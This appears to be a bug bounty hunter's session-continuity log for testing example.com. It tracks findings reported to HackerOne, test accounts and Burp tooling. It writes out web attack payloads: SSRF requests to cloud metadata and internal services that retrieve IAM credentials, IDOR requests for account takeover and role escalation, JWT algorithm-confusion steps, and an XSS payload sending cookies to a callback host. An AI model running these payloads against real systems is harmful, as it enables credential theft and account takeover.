# Task Persistence — Continuity Log

Session continuity and handoff log. This file is the bridge between
hunting sessions — it captures what was happening at the end of the
last session so you can pick up exactly where you left off without
wasting time re-reading context.

---

## Table of Contents

1. [Continuity Overview](#1-continuity-overview)
2. [Current Handoff](#2-current-handoff)
3. [Handoff History](#3-handoff-history)
4. [In-Flight Payloads](#4-in-flight-payloads)
5. [Pending Callbacks](#5-pending-callbacks)
6. [Tool State Continuity](#6-tool-state-continuity)
7. [Account Continuity](#7-account-continuity)
8. [Finding Continuity](#8-finding-continuity)
9. [Session Handoffs](#9-session-handoffs)
10. [Machine Handoffs](#10-machine-handoffs)
11. [Handoff Templates](#11-handoff-templates)
12. [Maintenance](#12-maintenance)

---

## 1. Continuity Overview

### 1.1 Summary

```
CURRENT SESSION: 2026-06-07 example.com
LAST SESSION: 2026-06-06 example.com
CONTINUITY STATUS: Active (resumed, 45 min elapsed)

HANDOFF QUALITY:
  Last session handoff notes: Complete
  Current handoff clarity: Clear
  In-flight payloads pending: 2
  Pending callbacks: 1
  Accounts needing refresh: 1
```

### 1.2 What Continuity Means

```
Continuity means:
  - You can resume hunting within 5 minutes of opening the system
  - You don't need to re-read full context files
  - You know what you were testing and what came next
  - You know what responses you were waiting for
  - You know what findings need attention
  - You know which tools need configuration
  - You know which accounts are valid
```

---

## 2. Current Handoff

### 2.1 Handoff Note

```
=== HANDOFF: End of Session 2026-06-07 Expected 12:00 ===

LAST TESTED:
  Endpoint: POST /api/avatar
  Payload: {"url":"http://169.254.169.254/latest/meta-data/iam/security-credentials/"}
  Response: 200 OK — IAM credentials retrieved!
  Status: VULN CRITICAL — IAM credentials exposed

PENDING TESTS (next session):
  1. GCP metadata: http://metadata.google.internal/computeMetadata/v1/
  2. Azure metadata: http://169.254.169.254/metadata/instance?api-version=2021-02-01
  3. Internal services: http://127.0.0.1:9200/_cat/indices
  4. JWT HS256 confusion: fetch JWK, convert to PEM, sign HS256
  5. IDOR more endpoints: PUT /api/v2/users/{id}/role

PENDING VALIDATIONS:
  - SSRF (FIND-001): Need impact screenshots and IAM cred demonstration
  - JWT (FIND-002): Need all 4 screenshots and HAR

TOOLS TO RESTORE:
  - Burp project: example-com-20260607.burp
  - New collaborator URL
  - Refresh all 3 account tokens
  - Load evidence-toolkit.ps1 for screenshots

ACCOUNTS AT END:
  attacker+1@test.com: TOKEN EXPIRED — MUST REFRESH
  victim+1@test.com: TOKEN EXPIRED — MUST REFRESH
  admin+1@test.com: TOKEN EXPIRED — MUST REFRESH

NEXT SESSION PRIORITIES:
  1. Refresh all accounts (5 min)
  2. Capture SSRF impact screenshots (10 min)
  3. Complete JWT evidence (15 min)
  4. Write and submit SSRF report (20 min)
  5. Write and submit JWT report (20 min)
  6. Start new recon on GraphQL if time permits

ESTIMATED TIME TO RESUME: 5 min
ESTIMATED TIME TO COMPLETE PENDING: 70 min
```

### 2.2 Current Continuity State

```
CONTINUITY STATE: RESUME READY

IF RESUMING NOW:
  1. Check .env.local for tokens (refresh if needed)
  2. Start Burp Suite, load project
  3. New collaborator URL
  4. . .\tools\powershell\powershell-lib.ps1
  5. . .\tools\powershell\curl-hunter.ps1
  6. Continue SSRF testing (IAM creds already retrieved)
  7. Test: GCP metadata next
```

---

## 3. Handoff History

### 3.1 Previous Handoffs

```
=== HANDOFF: End of Session 2026-06-06 ===

LAST TESTED:
  - IDOR: PUT /api/v2/users/4242/profile {"email":"attacker@evil.com"}
  - Response: 200 OK — EMAIL CHANGED! ATO CONFIRMED!

PENDING TESTS (next session):
  1. SSRF cloud metadata (AWS confirmed working, need GCP/Azure)
  2. JWT HS256 confusion (need to fetch JWK)
  3. IDOR more endpoints (role change, account deletion)

PENDING VALIDATIONS:
  - JWT (FIND-002): Need evidence captured — NO screenshots yet
  - IDOR (FIND-003): Evidence captured, report ready to submit

TOOLS TO RESTORE:
  - Burp project: example-com-20260606.burp
  - New collaborator URL
  - REFRESH ALL TOKENS (just did at end, but 24h JWT)

NEXT SESSION PRIORITIES:
  1. Capture JWT evidence screenshots
  2. Submit IDOR report to HackerOne
  3. Continue SSRF cloud metadata

HANDOFF QUALITY: Good — all state captured
```

### 3.2 Handoff Quality Ratings

```
| Session | Handoff Quality | Notes |
|---------|----------------|-------|
| 2026-06-07 | (Not yet ended) | — |
| 2026-06-06 | ★★★★★ | All state captured clearly |
| 2026-06-05 | ★★★★☆ | Some payload data missing |
| 2026-06-04 | ★★★☆☆ | Minimal handoff, had to re-read |
| 2026-06-03 | ★★★★☆ | Good notes, missing account state |
| 2026-06-02 | ★★★☆☆ | First session, minimal tracking |
```

---

## 4. In-Flight Payloads

### 4.1 Current In-Flight Payloads

Payloads that have been sent but not fully processed or that need
follow-up in the next session:

```
IN-FLIGHT: SSRF AWS IAM Credentials
  Status: RETRIEVED — IAM credentials obtained
  Action needed: None (data collected)
  Next step: Test GCP/Azure metadata
  
IN-FLIGHT: JWT HS256 Confusion
  Status: NOT STARTED
  Action needed: Fetch JWK from /.well-known/jwks.json
  Payload: GET /.well-known/jwks.json
  Est. time: 10 min

IN-FLIGHT: IDOR Role Change
  Status: PENDING
  Action needed: PUT /api/v2/users/{victim}/role
  Payload: {"role":"admin"}
  Est. time: 5 min
```

### 4.2 Payload Queue for Next Session

```
QUEUED FOR NEXT SESSION:

Priority 1 — SSRF GCP:
  GET /api/avatar
  Body: {"url":"http://metadata.google.internal/computeMetadata/v1/"}
  Header: Metadata-Flavor: Google
  Expected: Project and instance metadata
  Impact: HIGH — cloud metadata access

Priority 2 — SSRF Azure:
  GET /api/avatar
  Body: {"url":"http://169.254.169.254/metadata/instance?api-version=2021-02-01"}
  Expected: Azure instance metadata
  Impact: HIGH — cloud metadata access

Priority 3 — SSRF Internal:
  GET /api/avatar
  Body: {"url":"http://127.0.0.1:9200/_cat/indices"}
  Expected: Elasticsearch indices
  Impact: HIGH — internal service data
```

---

## 5. Pending Callbacks

### 5.1 Callback Status

```
PENDING CALLBACKS:
  None currently — all callbacks received or not applicable

CALLBACK HISTORY:
  Session 2026-06-05: SSRF blind callback received from
    collaborator (DNS lookup from target server IP)
    Status: RESOLVED — SSRF confirmed

  Session 2026-06-06: XSS callback pending
    Payload: <script>new Image().src='https://collab/o/'+document.cookie</script>
    Status: NO CALLBACK RECEIVED after 24h
    Action: Kill finding or try different payload
```

### 5.2 Callback Monitoring

```
CALLBACK MONITORING STATUS:
  Collaborator: xxxxxx.oastify.com — Active (2 callbacks received this session)
  interact.sh: yyyyyy.interact.sh — Active (0 callbacks received)

NEXT SESSION STARTUP:
  [ ] New collaborator URL
  [ ] New interact.sh URL
  [ ] Monitor for previous callbacks
  [ ] Check any late callbacks from previous session
```

---

## 6. Tool State Continuity

### 6.1 Current Tool Continuity

```
TOOL CONTINUITY: End of Session

BURP SUITE:
  Project: example-com-20260607.burp
  Saved: Not yet (will save at end)
  Size: ~5MB
  Contains:
    - All SSRF requests/responses
    - IAM credential responses
    - JWT test requests

  RESTORE INSTRUCTION:
    1. Burp -> Project -> Open
    2. Select projects/example-com-YYYYMMDD.burp

COLLABORATOR:
  Current URL: xxxxxx.oastify.com
  Will expire: At session end
  Next session: New URL needed

POWERSHELL:
  Scripts loaded: powershell-lib.ps1, curl-hunter.ps1
  Variables set: $env:ATTACKER_TOKEN, etc.
  Will expire: At session end
  Next session: Reload scripts and re-set env vars
```

### 6.2 Tool Continuity Reminders

```
TOOL REMINDERS FOR NEXT SESSION:
  [ ] Start Burp Suite
  [ ] Load or create new Burp project
  [ ] Set up new collaborator URL
  [ ] Configure proxy in browser (127.0.0.1:8080)
  [ ] Load PowerShell scripts
  [ ] Set environment variables
  [ ] Verify proxy intercepting
  [ ] Test collaborator callback
```

---

## 7. Account Continuity

### 7.1 Current Account Continuity

```
ACCOUNT CONTINUITY: End of Session

attacker+1@test.com:
  Token: Will expire at 24h from refresh
  Last refreshed: 10:45
  Will expire: ~10:45 next day
  Status: OK — will need refresh at next session start

victim+1@test.com:
  Token: Same as above
  Status: OK — will need refresh at next session start

admin+1@test.com:
  Token: EXPIRED (last refreshed 2026-06-05)
  Status: MUST REFRESH at next session start
  Action: POST /api/auth/login with admin credentials
  Est. time: 2 min
```

### 7.2 Token Refresh Procedure

```powershell
# Refresh tokens for next session
function Refresh-Tokens {
    param([string]$Email, [string]$Password)

    $body = @{email=$Email; password=$Password} | ConvertTo-Json
    $response = Invoke-RestMethod -Uri "https://api.example.com/api/auth/login" `
        -Method POST `
        -Body $body `
        -ContentType "application/json" `
        -Proxy "http://127.0.0.1:8080"

    return $response.token
}

# Run at session start:
# $env:ATTACKER_TOKEN = Refresh-Tokens -Email "attacker+1@test.com" -Password "xxx"
# $env:VICTIM_TOKEN = Refresh-Tokens -Email "victim+1@test.com" -Password "xxx"
# $env:ADMIN_TOKEN = Refresh-Tokens -Email "admin+1@test.com" -Password "xxx"
```

---

## 8. Finding Continuity

### 8.1 Current Finding Continuity

```
FINDING CONTINUITY: End of Session

FIND-001: SSRF Cloud Metadata
  Status: ACTIVE — IAM credentials retrieved
  Next action: Capture impact screenshots, write report
  Evidence: 2 of 4 screenshots captured
  Priority: HIGH — submit this session if possible

FIND-002: JWT alg:none
  Status: CONFIRMED (previous session)
  Next action: Capture evidence, write report
  Evidence: 0 of 4 screenshots captured
  Priority: HIGH — has been waiting 2 sessions

FIND-003: IDOR Write -> ATO
  Status: SUBMITTED to HackerOne
  Next action: Wait for triage
  Priority: LOW — submitted, waiting
```

### 8.2 Finding Continuity Checklist

```
NEXT SESSION FINDING CHECKLIST:
  [ ] FIND-001: Capture 2 more screenshots
  [ ] FIND-001: Create evidence package
  [ ] FIND-001: Validate (7-Question Gate)
  [ ] FIND-001: Write report
  [ ] FIND-001: Submit to HackerOne
  [ ] FIND-002: Capture 4 screenshots
  [ ] FIND-002: Create evidence package  
  [ ] FIND-002: Validate (7-Question Gate)
  [ ] FIND-002: Write report
  [ ] FIND-002: Submit to HackerOne
  [ ] FIND-003: Check triage status
```

---

## 9. Session Handoffs

### 9.1 Session-to-Session Handoff

```
HANDOFF: Session 2026-06-06 -> Session 2026-06-07

FROM: 2026-06-06 (ended 12:00, target: example.com)
TO:   2026-06-07 (started 10:00, target: example.com)

CONTINUITY:
  [x] SSRF: AWS metadata confirmed working — continue with cloud metadata
  [x] JWT: alg:none confirmed — needs evidence capture
  [x] IDOR: write confirmed — already submitted
  [x] Tokens: all refreshed at end of session (will need again)
  [x] Burp: project saved as example-com-20260606.burp
  [x] Collaborator URL recorded for next session

GAPS FILLED:
  - None — previous handoff was complete
```

### 9.2 Handoff Checklist

```
HANDOFF CHECKLIST (perform at end of every session):

  [ ] 1. Save Burp project file
  [ ] 2. Record last payloads sent
  [ ] 3. Note pending tests
  [ ] 4. Record all pending callbacks
  [ ] 5. Save collaborator/backup URLs
  [ ] 6. Refresh tokens if possible
  [ ] 7. Record token expiry times
  [ ] 8. Save session state to task-presistence/session-states.md
  [ ] 9. Update continuity log (this file)
  [ ] 10. List next session priorities
  [ ] 11. Estimate resume time
  [ ] 12. Rate handoff quality
```

---

## 10. Machine Handoffs

### 10.1 Machine-to-Machine Handoff

For switching between desktop and laptop:

```
HANDOFF: Desktop -> Laptop
DATE: 2026-06-07

FILES TO TRANSFER:
  [x] context/hunt-session.md (live session)
  [x] context/active-target.md (target context)
  [x] context/chain-primitives.md (chain tracking)
  [x] memory/target-registry.md (target memory)
  [x] memory/lessons-log.md (lessons learned)
  [x] .env.local (tokens and secrets)
  [ ] Burp project file (too large — start fresh)
  [ ] Evidence screenshots (too large — capture fresh)

GIT SYNC:
  git add -A
  git commit -m "End of session — machine handoff"
  git push

ON NEW MACHINE:
  git pull
  .\install.ps1
  copy .env.local
  Start Burp Suite (new project)
  Test tokens
  Resume hunting
```

### 10.2 Cloud Sync

```
CLOUD SYNC OPTIONS:
  [x] Git (primary — code, config, memory, tasks)
  [ ] git LFS (wordlists — too large for regular git)
  [ ] Cloud storage (screenshots, evidence — too large for git)
  [ ] External drive (full Burp project backups)
```

---

## 11. Handoff Templates

### 11.1 Session Handoff Template

```
=== HANDOFF: End of Session YYYY-MM-DD ===

TARGET: [domain]
PROGRAM: [name]
SESSION DURATION: [N]h [N]min

LAST TESTED:
  Endpoint: [URL]
  Method: [GET/POST/PUT/DELETE]
  Payload: [payload]
  Response: [status code — summary]
  Status: [VULN / Not vuln / Pending]

PENDING TESTS (next session):
  1. [test 1]
  2. [test 2]
  3. [test 3]

PENDING FINDINGS:
  [finding 1]: [status] — [next action]
  [finding 2]: [status] — [next action]

TOOLS STATE:
  Burp project: [filename]
  Collaborator URL: [URL]
  Tokens expire: [time/date]

NEXT SESSION PRIORITIES:
  1. [priority 1]
  2. [priority 2]
  3. [priority 3]

ESTIMATED RESUME TIME: [N] min
```

### 11.2 Machine Handoff Template

```
HANDOFF: [machine A] -> [machine B]
DATE: YYYY-MM-DD

GIT SYNC:
  git add -A
  git commit -m "Handoff from [machine A]"
  git push

ON [machine B]:
  git pull
  .\install.ps1
  Set environment variables from .env.local
  Start Burp Suite
  Test tokens

RESUME:
  See context/hunt-session.md for active state
  See task-presistence/continuity-log.md for pending tests
```

---

## 12. Maintenance

```
DAILY:
  [ ] Write handoff note at end of session
  [ ] Rate handoff quality
  [ ] Save all state files

WEEKLY:
  [ ] Review handoff history for quality
  [ ] Check continuity log completeness
  [ ] Update handoff templates if needed
  [ ] Verify git sync works

MONTHLY:
  [ ] Archive old handoff notes
  [ ] Review handoff patterns (what's consistently missing?)
  [ ] Update procedures based on lessons
  [ ] Test full handoff recovery
```

---

*End of continuity-log.md*
